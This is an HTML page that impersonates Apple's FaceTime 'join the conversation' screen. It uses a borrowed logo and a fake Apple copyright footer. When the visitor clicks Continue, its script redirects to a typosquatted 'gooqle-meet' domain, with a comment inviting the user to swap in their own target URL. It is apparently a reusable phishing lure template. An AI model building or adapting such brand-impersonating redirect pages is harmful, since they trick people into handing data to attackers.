<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FaceTime Join</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 300px;
      text-align: center;
    }

    .icon {
      width: 72px;
      height: 72px;
      margin: 0 auto 14px;
      border-radius: 16px;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
      background: transparent;
    }

    .icon img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    h1 {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 8px;
    }

    p {
      font-size: 14px;
      color: #aaa;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: none;
      margin-bottom: 12px;
      background-color: #1c1c1e;
      color: #fff;
      font-size: 14px;
    }

    input::placeholder {
      color: #666;
    }

    button {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: none;
      background-color: #3a3a3c;
      color: #888;
      font-size: 14px;
      cursor: not-allowed;
    }

    .footer {
      position: absolute;
      bottom: 20px;
      width: 100%;
      text-align: center;
      font-size: 11px;
      color: #555;
    }

    .footer a {
      color: #555;
      text-decoration: none;
      margin: 0 6px;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="icon">
      <img src="https://raw.githubusercontent.com/emeraldperez00-cloud/images/refs/heads/main/FaceTime_iOS.svg-removebg-preview.png" alt="FaceTime Logo">
    </div>
    <h1>FaceTime</h1>
    <p>Enter your name to join the conversation.</p>

    <input type="text" placeholder="Name">
    <button id="continueBtn" disabled>Continue</button>

    <script>
      const input = document.querySelector('input');
      const button = document.getElementById('continueBtn');

      input.addEventListener('input', () => {
        if (input.value.trim().length > 0) {
          button.disabled = false;
          button.style.backgroundColor = '#0a84ff';
          button.style.color = '#fff';
          button.style.cursor = 'pointer';
        } else {
          button.disabled = true;
          button.style.backgroundColor = '#3a3a3c';
          button.style.color = '#888';
          button.style.cursor = 'not-allowed';
        }
      });

      button.addEventListener('click', () => {
        if (!button.disabled) {
          window.location.href = 'https://gooqle-meet-live-call.4-5s.com/sing-up'; // change to your target URL
        }
      });
    </script>
  </div>

  <div class="footer">
    <a href="#">System Status</a>
    <a href="#">Privacy Policy</a>
    <a href="#">Terms of Use</a>
    <a href="#">Legal</a>
    <div style="margin-top:6px;">Copyright © 2026 Apple Inc. All rights reserved.</div>
  </div>
</body>
</html>
